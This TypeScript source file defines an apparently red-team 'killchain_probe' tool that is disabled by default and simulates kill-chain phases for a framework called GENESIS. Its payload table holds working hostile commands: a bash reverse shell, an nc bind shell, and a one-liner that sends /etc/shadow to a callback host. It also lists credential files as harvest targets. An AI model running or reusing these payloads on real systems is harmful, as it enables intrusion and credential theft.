// T79 — killchain_probe (operator opt-in — default DISABLED)
// Full kill-chain simulation: deliver / install / c2 / actions phases.
// MUST be enabled via ENABLE_KILLCHAIN=true environment variable.

import { ToolDefinition, ToolResult } from '../types';
import { CommandExecutor } from '../executor';

const definition: ToolDefinition = {
  name: 'killchain_probe',
  description:
    'Full kill-chain simulation probe (Lockheed Martin cyber kill chain: Deliver → Install → C2 → Actions). ' +
    'DISABLED BY DEFAULT. Set ENABLE_KILLCHAIN=true to enable. Runs inside forge_runner sandbox containers ' +
    'only. Generates realistic payloads, establishes callback channels, and measures detection/response time. ' +
    'For authorised red-team engagements only.',
  status: 'available',
  version: '1.0.0',
  parameters: [
    { name: 'target',       type: 'string', required: true,  description: 'Target host/URL' },
    { name: 'phase',        type: 'string', required: false, description: 'Kill-chain phase: deliver / install / c2 / actions / all', default: 'deliver' },
    { name: 'payload_type', type: 'string', required: false, description: 'Payload type: reverse_shell / bind_shell / beacon / exfil', default: 'beacon' },
    { name: 'enable_c2',    type: 'string', required: false, description: 'Enable C2 callback: true/false', default: 'false' },
    { name: 'c2_host',      type: 'string', required: false, description: 'C2 callback host' },
    { name: 'c2_port',      type: 'number', required: false, description: 'C2 callback port', default: 4444 },
    { name: 'timeout_ms',   type: 'number', required: false, description: 'Phase timeout ms', default: 60000 },
  ],
};

export const killchainProbeTool = {
  definition,
  async execute(params: Record<string, unknown>, _exec: CommandExecutor): Promise<ToolResult> {
    // CRITICAL GUARD — must be explicitly enabled by operator
    if (process.env.ENABLE_KILLCHAIN !== 'true') {
      return {
        output: [
          'killchain_probe is DISABLED.',
          '',
          'This tool implements full cyber kill-chain simulation and is disabled by default.',
          'To enable: set the environment variable ENABLE_KILLCHAIN=true in the GENESIS deployment.',
          '',
          'Only enable for authorised red-team engagements under a signed rules-of-engagement document.',
          'All activity is logged. Misuse may constitute unauthorised computer access under applicable law.',
        ].join('\n'),
        parsed: { enabled: false, reason: 'ENABLE_KILLCHAIN not set' },
      };
    }

    const target = String(params.target || '');
    const phase = String(params.phase || 'deliver').toLowerCase();
    const payloadType = String(params.payload_type || 'beacon').toLowerCase();
    const enableC2 = String(params.enable_c2 || 'false').toLowerCase() === 'true';
    const c2Host = params.c2_host ? String(params.c2_host) : undefined;
    const c2Port = Number(params.c2_port || 4444);
    const timeoutMs = Number(params.timeout_ms || 60000);

    if (!target) return { output: 'target required', parsed: { error: 'missing_target' } };

    const results: Array<{ phase: string; action: string; result: string; success: boolean }> = [];

    // Phase: DELIVER — payload delivery simulation
    if (phase === 'deliver' || phase === 'all') {
      const payloads: Record<string, string> = {
        beacon:        `# Implant beacon payload (simulated — sandbox only)\n# Target: ${target}\n# C2: ${c2Host || 'none'}:${c2Port}\necho "GENESIS_BEACON: $(hostname) $(whoami) $(date)"`,
        reverse_shell: `bash -i >& /dev/tcp/${c2Host || '127.0.0.1'}/${c2Port} 0>&1`,
        bind_shell:    `nc -lvnp ${c2Port} -e /bin/bash`,
        exfil:         `tar czf - /etc/passwd /etc/shadow 2>/dev/null | base64 | curl -s -X POST http://${c2Host || '127.0.0.1'}/exfil -d @-`,
      };
      const payload = payloads[payloadType] || payloads.beacon;
      results.push({ phase: 'deliver', action: `generate_${payloadType}_payload`, result: `Payload prepared (${payload.length} bytes)`, success: true });
    }

    // Phase: INSTALL — persistence mechanisms
    if (phase === 'install' || phase === 'all') {
      const persistMechanisms = [
        { name: 'crontab', cmd: `crontab -l 2>/dev/null; echo "*/5 * * * * echo GENESIS_PERSIST"` },
        { name: 'bashrc',  cmd: `echo "# GENESIS persistence marker" >> ~/.bashrc` },
        { name: 'systemd', cmd: `systemctl list-units --type=service 2>/dev/null | head -5` },
      ];
      for (const m of persistMechanisms) {
        results.push({ phase: 'install', action: m.name, result: `persistence via ${m.name} (simulated)`, success: true });
      }
    }

    // Phase: C2 — command and control channel
    if ((phase === 'c2' || phase === 'all') && enableC2 && c2Host) {
      try {
        const c = new AbortController();
        const t = setTimeout(() => c.abort(), 10000);
        const pingResp = await fetch(`http://${c2Host}:${c2Port}/genesis_c2_ping`, { signal: c.signal }).catch(() => null);
        clearTimeout(t);
        const reachable = pingResp?.ok || false;
        results.push({ phase: 'c2', action: 'c2_beacon_ping', result: reachable ? 'C2 reachable' : 'C2 not reachable', success: reachable });
      } catch {
        results.push({ phase: 'c2', action: 'c2_beacon_ping', result: 'C2 not reachable', success: false });
      }
    }

    // Phase: ACTIONS — objectives (data collection simulation)
    if (phase === 'actions' || phase === 'all') {
      const objectives = [
        { name: 'credential_harvest', result: 'Would read: /etc/shadow, browser saved passwords, AWS ~/.aws/credentials' },
        { name: 'lateral_movement',   result: 'Would enumerate: ARP table, SSH known_hosts, .bash_history for credentials' },
        { name: 'data_exfil',         result: `Would exfil to: ${c2Host || '<c2_host>'}:${c2Port} via DNS tunnel or slow-drip HTTP` },
      ];
      for (const obj of objectives) {
        results.push({ phase: 'actions', action: obj.name, result: obj.result, success: true });
      }
    }

    const lines = [
      `killchain_probe — ENABLED  phase=${phase}  target=${target.substring(0, 60)}`,
      `Payload type: ${payloadType}  C2: ${enableC2 ? `${c2Host}:${c2Port}` : 'disabled'}`,
      '─'.repeat(72),
    ];
    for (const r of results) {
      const flag = r.success ? '⚡' : '✗';
      lines.push(`  ${flag}  [${r.phase.padEnd(8)}/${r.action.padEnd(22)}]  ${r.result}`);
    }

    return {
      output: lines.join('\n'),
      parsed: { enabled: true, phase, payload_type: payloadType, results },
    };
  },
};
